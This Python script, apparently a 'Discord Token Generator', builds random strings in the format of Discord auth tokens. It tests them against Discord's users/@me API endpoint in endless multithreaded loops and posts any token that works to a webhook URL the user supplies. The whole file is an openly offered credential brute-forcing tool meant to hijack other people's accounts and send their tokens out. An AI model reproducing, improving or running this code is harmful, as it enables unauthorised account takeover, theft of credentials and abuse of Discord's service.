# (c) 2026 IxilaA1 - Tous droits réservés / All rights reserved / Todos los derechos reservados.
# Ce code ne peut être ni vendu, ni modifié, ni partagé sans autorisation, ni publié à votre nom.
# This code may not be sold, modified, or shared without authorization, nor published under your name.
# Este código no puede ser vendido, modificado ni compartido sin autorización, ni publicado a su nombre.
# -------------------------------------------------------------------------------------------------------

import string
import requests
import json
import random
import threading
import time
import sys
import os
from datetime import datetime

        
logo_ascii = """
                                              @@@@                @%@@                                      
                                       @@@@@@@@@@@@               @@@@@@@@@@%                               
                                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                          
                                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                         
                                %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                        
                               @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                       
                              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
                             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                     
                            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                    
                           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                   
                          %@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@%                  
                          %@@@@@@@@@@@@@@@@        %@@@@@@@@@@@%@        @@@@@@@@@@@@@@@@@                  
                          %@@@@@@@@@@@@@@@          @@@@@@@@@@@@          @@@@@@@@@@@@@@@%                  
                         %@@@@@@@@@@@@@@@@          @@@@@@@@@@@%          %@@@@@@@@@@@@@@@@                 
                         @@@@@@@@@@@@@@@@@%         @@@@@@@@@@@%         %@@@@@@@@@@@@@@@@@                 
                         @@@@@@@@@@@@@@@@@@@      %@@@@@@@@@@@@@@@      @@@@@@@@@@@@@@@@@@%                 
                         %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                 
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                 
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                 
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                 
                           @%@@@@@@@@@@@@@%@@   @@@@%@@@@@@@@@%%%@%@@  @@@@@@@@@@@@@@@@@@                   
                              @@%@@@@@@@@@@@@@                        @%@@@@@@@@@@@%@@                      
                                   @%@@@@@@@                            @@@@@@%%@                           
                                         @@                              @@             

"""


os.system('cls' if os.name == 'nt' else 'clear')


print(logo_ascii)


time.sleep(2)


class color:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'


BEFORE = f"{color.RED}[{color.RESET}"
AFTER = f"{color.RED}]{color.RESET}"
BEFORE_GREEN = f"{color.GREEN}[{color.RESET}"
AFTER_GREEN = f"{color.GREEN}]{color.RESET}"
INPUT = f"{color.BLUE}?{color.RESET}"
GEN_VALID = f"{color.GREEN}+{color.RESET}"
GEN_INVALID = f"{color.RED}-{color.RESET}"


username_webhook = "Token Generator"
avatar_webhook = "https://cdn.discordapp.com/attachments/1070627384027967558/1070627630936453150/discord-avatar-512-YT0XE.png"
color_webhook = 16711680


discord_banner = r"""
   ____  _                        _    
  |  _ \(_)___  ___ ___  _ __ __| |   
  | | | | / __|/ __/ _ \| '__/ _` |   
  | |_| | \__ \ (_| (_) | | | (_| |   
  |____/|_|___/\___\___/|_|  \__,_|   
  |  \/  | __ _ _ __| | _____| |_     
  | |\/| |/ _` | '__| |/ / _ \ __|    
  | |  | | (_| | |  |   <  __/ |_     
  |_|  |_|\__,_|_|  |_|\_\___|\__|    
"""

def current_time_hour():
    return datetime.now().strftime('%H:%M:%S')

def Slow(text):
    for line in text.splitlines():
        print(line)
        time.sleep(0.05)

def Title(title):
    print(f"\n{color.CYAN}{'='*50}{color.RESET}")
    print(f"{color.CYAN}{title.center(50)}{color.RESET}")
    print(f"{color.CYAN}{'='*50}{color.RESET}\n")

def CheckWebhook(webhook_url):
    try:
        response = requests.get(webhook_url)
        if response.status_code == 200:
            print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Webhook is valid")
        else:
            print(f"{BEFORE + current_time_hour() + AFTER} {GEN_INVALID} Webhook may be invalid")
    except:
        print(f"{BEFORE + current_time_hour() + AFTER} {GEN_INVALID} Webhook error")

def ErrorModule(e):
    print(f"{BEFORE + current_time_hour() + AFTER} {GEN_INVALID} Module error: {e}")
    sys.exit(1)

def ErrorNumber():
    print(f"{BEFORE + current_time_hour() + AFTER} {GEN_INVALID} Please enter a valid number")
    sys.exit(1)

def Error(e):
    print(f"{BEFORE + current_time_hour() + AFTER} {GEN_INVALID} Error: {e}")
    sys.exit(1)

def send_webhook(webhook_url, embed_content):
    try:
        payload = {
            'embeds': [embed_content],
            'username': username_webhook,
            'avatar_url': avatar_webhook
        }

        headers = {
            'Content-Type': 'application/json'
        }

        requests.post(webhook_url, data=json.dumps(payload), headers=headers, timeout=10)
    except:
        pass

def token_check(webhook_url, use_webhook):
    first = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([24, 26])))
    second = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([6])))
    third = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([38])))
    token = f"{first}.{second}.{third}"

    try:
        response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}, timeout=10)
        if response.status_code == 200:
            user_data = response.json()
            if 'username' in user_data:
                if use_webhook and webhook_url:
                    embed_content = {
                        'title': 'Token Valid !',
                        'description': f"**Token:**\n```{token}```",
                        'color': color_webhook,
                        'footer': {
                            "text": username_webhook,
                            "icon_url": avatar_webhook,
                        }
                    }
                    send_webhook(webhook_url, embed_content)
                print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Status:  {color.WHITE}Valid{color.GREEN}  Token: {color.WHITE}{token}{color.GREEN}")
            else:
                print(f"{BEFORE + current_time_hour() + AFTER} {GEN_INVALID} Status: {color.WHITE}Invalid{color.RED} Token: {color.WHITE}{token}{color.RED}")
        else:
            print(f"{BEFORE + current_time_hour() + AFTER} {GEN_INVALID} Status: {color.WHITE}Invalid{color.RED} Token: {color.WHITE}{token}{color.RED}")
    except Exception as e:
        print(f"{BEFORE + current_time_hour() + AFTER} {GEN_INVALID} Status: {color.WHITE}Error{color.RED} Token: {color.WHITE}{token}{color.RED}")

def request_threads(threads_number, webhook_url, use_webhook):
    threads = []
    try:
        for _ in range(int(threads_number)):
            t = threading.Thread(target=token_check, args=(webhook_url, use_webhook))
            t.daemon = True
            t.start()
            threads.append(t)
            time.sleep(0.01) 
    except:
        ErrorNumber()

    for thread in threads:
        thread.join()

def main():
    try:
        Title("Discord Token Generator")
        Slow(discord_banner)
        
        webhook_choice = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Webhook ? (y/n) -> {color.RESET}")
        use_webhook = webhook_choice.lower() in ['y', 'yes']
        webhook_url = ""
        
        if use_webhook:
            webhook_url = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Webhook URL -> {color.RESET}")
            CheckWebhook(webhook_url)

        try:
            threads_number = int(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Threads Number -> {color.RESET}"))
        except:
            ErrorNumber()

        print(f"\n{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Starting token generation with {threads_number} threads...\n")

        while True:
            request_threads(threads_number, webhook_url, use_webhook)
            
    except KeyboardInterrupt:
        print(f"\n{BEFORE + current_time_hour() + AFTER} {GEN_INVALID} Script interrupted by user")
        sys.exit(0)
    except Exception as e:
        Error(e)

if __name__ == "__main__":
    main()